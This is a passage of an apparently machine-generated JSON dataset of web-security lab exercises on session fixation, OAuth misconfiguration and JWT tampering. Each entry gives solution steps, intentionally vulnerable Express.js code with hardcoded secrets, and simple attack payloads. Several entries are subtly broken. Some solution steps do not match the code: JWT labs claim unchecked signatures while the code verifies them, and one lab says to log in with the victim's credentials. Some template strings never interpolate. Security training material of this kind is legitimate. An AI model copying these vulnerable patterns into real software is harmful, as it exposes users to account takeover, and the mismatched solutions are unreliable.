    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Set a custom session ID in your browser using Burp Suite's Intercept feature.",
      "2. Login to the victim's account using their credentials and submit the session ID you set previously.",
      "3. Check if the application maintains the session after logging in with the custom ID.",
      "4. If the session ID is maintained, access the victim's account page using the hijacked session.",
      "5. If the account page loads successfully, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'superSecret', resave: false, saveUninitialized: true }));\n\nconst users = [{ username: 'carlos', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.username = username;\n    return res.send('Logged in');\n  }\n  return res.status(401).send('Invalid credentials');\n});\n\napp.get('/my-account', (req, res) => {\n  if (req.session.username) {\n    res.send('Account details for ' + req.session.username);\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
    "payloads": [
      "SESSION_ID=xyz1234567890",
      "SESSION_ID=abc0987654321"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leading to unauthorized access",
    "Lab Description": "This lab's OAuth 2.0 implementation is misconfigured, allowing users to access sensitive endpoints without proper authorization. By exploiting this misconfiguration, the attacker can gain unauthorized access to the admin panel. To solve the lab, perform an OAuth flow that grants admin access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture the OAuth token request using Burp Suite's Proxy.",
      "2. Inspect the OAuth request and identify the 'scope' parameter, which may indicate a privileged access level.",
      "3. Modify the scope to request 'admin' access instead of the default user access.",
      "4. Send the modified request and obtain an OAuth token with admin privileges.",
      "5. Use the token to access the admin panel and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst oauth2 = require('simple-oauth2');\nconst app = express();\n\nconst oauth2Client = oauth2.create({\n  client: { id: 'myClientId', secret: 'myClientSecret' },\n  auth: { tokenHost: 'http://localhost:3000' }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { scope } = req.body;\n  if (scope === 'admin') {\n    return res.json({ access_token: 'adminToken123' });\n  } else {\n    return res.json({ access_token: 'userToken123' });\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization'];\n  if (token === 'adminToken123') {\n    return res.send('Welcome to the admin panel');\n  }\n  return res.status(403).send('Access denied');\n});\n\napp.listen(3000, () => console.log('OAuth Misconfiguration Lab running on http://localhost:3000'));",
    "payloads": [
      "grant_type=password&username=admin&password=admin123&scope=admin",
      "grant_type=authorization_code&code=authCode123&scope=admin"
    ]
  },
  {
    "Lab scenario": "JWT tampering for unauthorized access",
    "Lab Description": "This lab involves a vulnerable JWT-based authentication system. The application uses JWT tokens for session management but improperly validates the token signature. To solve the lab, you need to intercept and modify the JWT to impersonate a different user and access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login request. Capture the JWT in the Authorization header of the response.",
      "2. Examine the JWT structure and note that it contains three parts: header, payload, and signature. Decode the header and payload using an online JWT decoder.",
      "3. Use a tool like JWT.io to sign the JWT manually with a known key (found by brute-forcing or trial and error), then replace the signature with the newly generated one.",
      "4. Send the modified JWT back in the Authorization header of a request to access the target user's account page.",
      "5. Verify that you now have access to the user’s account, thus solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'admin', password: 'password123', role: 'admin' }, { username: 'user', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = jwt.sign({ username: user.username, role: user.role }, 'secretKey'); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('No token provided'); jwt.verify(token, 'secretKey', (err, decoded) => { if (err) return res.status(500).send('Failed to authenticate token'); res.send('Account of ' + decoded.username); }); }); const PORT = 3000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Bearer <modified_JWT_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation attack via cookie manipulation",
    "Lab Description": "This lab involves a vulnerable session management mechanism where the session ID is set by the server in a predictable way. By manipulating the session cookie, you can hijack the session and access the victim's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Start by logging in with your own credentials and observe the session cookie set by the server in the response.",
      "2. Using Burp Suite or browser dev tools, intercept and modify the session cookie. Set the session cookie to a known valid session ID for another user (e.g., 'admin').",
      "3. Send the modified cookie back in a request to access the victim's account.",
      "4. Verify that the account page now loads for the victim's account, thus completing the session fixation attack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { admin: { password: 'admin123', session: 'adminSession' }, user: { password: 'user123', session: 'userSession' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { res.cookie('session', users[username].session); res.send('Logged in as ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; if (!session || !Object.values(users).some(u => u.session === session)) { return res.status(403).send('Access denied'); } const user = Object.keys(users).find(u => users[u].session === session); res.send('Welcome ' + user); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "session=adminSession"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leading to unauthorized access",
    "Lab Description": "This lab involves a misconfigured OAuth implementation, allowing users to access sensitive information without proper authorization. The goal is to gain access to an admin's account by exploiting the OAuth flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth authorization request. Identify the authorization code in the URL after the user authenticates.",
      "2. Exchange the authorization code for an access token using the OAuth token endpoint.",
      "3. Using the access token, make an API request to retrieve sensitive user data. Observe that the API does not properly check user roles or permissions, allowing unauthorized access.",
      "4. Use the token to gain admin access to the target user's account and confirm the successful exploitation of the OAuth misconfiguration."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const request = require('request'); const app = express(); app.use(bodyParser.json()); const oauthConfig = { clientId: 'client123', clientSecret: 'secretKey', authorizationEndpoint: '/oauth/authorize', tokenEndpoint: '/oauth/token' }; let users = { user1: { role: 'user' }, admin: { role: 'admin' } }; app.get('/oauth/authorize', (req, res) => { const { code } = req.query; if (code) { res.redirect('/oauth/token?code=' + code); } else { res.send('Missing code'); } }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'validCode') { res.json({ access_token: 'token123' }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token123') { res.json({ username: 'admin', role: 'admin' }); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
    "payloads": [
      "code=validCode",
      "Authorization: Bearer token123"
    ]
  },
  {
    "Lab scenario": "JWT Token Manipulation in Authorization Header",
    "Lab Description": "The application uses JWT for user authentication. A flaw exists in how JWTs are validated, allowing attackers to manipulate the token to bypass authorization. To solve the lab, craft a tampered JWT token with the role 'admin' and use it to access Carlos's admin page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login request with Burp Suite and capture the JWT token.",
      "2. Decode the JWT token using a tool like jwt.io to inspect the header, payload, and signature.",
      "3. Modify the 'role' field in the payload to 'admin'. Re-encode the JWT token, ensuring the structure remains intact.",
      "4. Send the tampered JWT token as an Authorization header in a request to the /admin endpoint.",
      "5. If the server grants access to the admin page, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'mysecret'; const users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secret); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (token) { jwt.verify(token, secret, (err, decoded) => { if (err || decoded.role !== 'admin') return res.status(403).send('Forbidden'); res.send('Welcome to the admin page'); }); } else { res.status(401).send('Authorization required'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Third-party Service",
    "Lab Description": "The application allows users to authenticate via a third-party OAuth provider. Due to misconfigurations, it allows an attacker to obtain a valid access token and impersonate any user. To solve the lab, acquire an access token for Carlos and use it to gain unauthorized access to his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate the OAuth authorization flow with Burp Suite to capture the authorization code.",
      "2. Analyze the OAuth callback URL to observe that the application is not validating redirect URIs.",
      "3. Manipulate the redirect URI to redirect to a malicious server that you control.",
      "4. Capture the authorization code sent to your server and exchange it for an access token using the OAuth provider's token endpoint.",
      "5. Use the obtained access token to access Carlos's user profile endpoint and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/login', (req, res) => { const authUrl = 'https://thirdparty-oauth-provider.com/auth?client_id=myclient&redirect_uri=http://localhost:3000/callback'; res.redirect(authUrl); }); app.get('/callback', async (req, res) => { const { code } = req.query; const response = await axios.post('https://thirdparty-oauth-provider.com/token', { code, client_id: 'myclient', client_secret: 'mysecret', redirect_uri: 'http://localhost:3000/callback' }); const token = response.data.access_token; res.send(`Access token: ${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token) { res.send(`Welcome to your profile! Token: ${token}`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "Session Fixation Attack via URL Parameter",
    "Lab Description": "The application is vulnerable to session fixation attacks where the session ID is passed via a URL parameter. An attacker can fix the victim's session ID and hijack their session. To solve the lab, fix Carlos's session ID to your own and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to your own account and notice that a session ID is passed as a URL parameter (e.g., /dashboard?sessionID=xyz123).",
      "2. Manually modify the session ID parameter to set it to a value of your choosing.",
      "3. Send a request to the /login endpoint with the manipulated session ID in the URL.",
      "4. Observe the response to confirm that the session ID is accepted and your session is now linked to Carlos's account.",
      "5. Access Carlos's account page using the hijacked session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionId = req.query.sessionID || Math.random().toString(36).substr(2, 9); sessions[sessionId] = user.username; res.send(`Logged in with session ID: ${sessionId}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sessionId = req.query.sessionID; if (sessions[sessionId]) { res.send(`Welcome, ${sessions[sessionId]}!`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));"
  },

  {
    "Lab scenario": "Session Fixation via Predictable Session ID",
    "Lab Description": "In this lab, session fixation occurs because the server assigns a predictable session ID to the user when they log in. The attacker can set a session ID in advance, making it possible to hijack the session after the victim logs in. To solve the lab, force the server to accept a fixed session ID and gain access to Carlos's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Start a Burp Suite session and intercept the login request for your own account.",
      "2. Notice that a session ID is set in the response cookies. Observe its predictable pattern and set it as a fixed value for further exploitation.",
      "3. Log out and send the login request to Burp Suite with the fixed session ID set in the cookie.",
      "4. After successfully logging in with your own credentials, send the fixed session ID to Burp Repeater, modify the username parameter to 'carlos', and submit the request.",
      "5. Confirm that the session ID is reused for Carlos's account, and access the 'My Account' page to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(require('cookie-parser')()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password, session } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } res.cookie('session', session || 'abcd1234'); res.send('Login successful'); }); app.get('/account', (req, res) => { const { session } = req.cookies; const user = users.find(u => u.username === 'carlos'); if (user && session === 'abcd1234') { res.send('Account details for Carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "session=abcd1234"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in Authorization Header",
    "Lab Description": "This lab demonstrates a vulnerability where the JWT token is not properly signed, allowing for tampering of user data. The application does not properly verify the JWT's integrity, allowing an attacker to modify the token to impersonate Carlos and gain access to his account. To solve the lab, modify the JWT and access Carlos's account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the login request in Burp Suite and capture the JWT token in the Authorization header.",
      "2. Use a JWT decoder (e.g., jwt.io) to decode the token and understand its structure.",
      "3. Modify the payload to change the 'sub' (subject) field to 'carlos', and base64-encode the modified JWT payload.",
      "4. Replace the original JWT token with the modified one and send the request again using Burp Suite.",
      "5. Verify that the application grants access to Carlos's account when the tampered token is used, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = jwt.sign({ sub: username }, 'secretKey'); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization.split(' ')[1]; jwt.verify(token, 'secretKey', (err, decoded) => { if (err || decoded.sub !== 'carlos') { return res.status(403).send('Access denied'); } res.send('Account details for Carlos'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:4000'));",
    "payloads": [
      "Authorization: Bearer [MODIFIED_JWT_TOKEN]"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Leading to Privilege Escalation",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where an attacker can gain unauthorized access to an admin account by exploiting an improperly configured OAuth authorization flow. The attacker needs to manipulate the OAuth request to escalate privileges. To solve the lab, manipulate the OAuth flow to escalate to an admin role and access the admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth authorization request using Burp Suite and examine the request parameters.",
      "2. Notice that the 'scope' parameter is misconfigured and allows access to unauthorized resources.",
      "3. Modify the 'scope' parameter to include 'admin' and send the modified request to the OAuth token endpoint.",
      "4. Capture the OAuth token response and use it to make a request to the '/admin' endpoint.",
      "5. Verify that the response grants access to the admin dashboard, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }, { username: 'carlos', password: 'password123', role: 'user' }]; app.post('/oauth/authorize', (req, res) => { const { scope, username } = req.body; if (scope === 'admin') { res.json({ access_token: 'admin_token', token_type: 'bearer' }); } else { res.json({ access_token: 'user_token', token_type: 'bearer' }); } }); app.get('/admin', (req, res) => { const { authorization } = req.headers; if (authorization === 'Bearer admin_token') { res.send('Admin Dashboard'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:4000'));",
    "payloads": [
      "scope=admin",
      "Authorization: Bearer admin_token"
    ]
  }
]
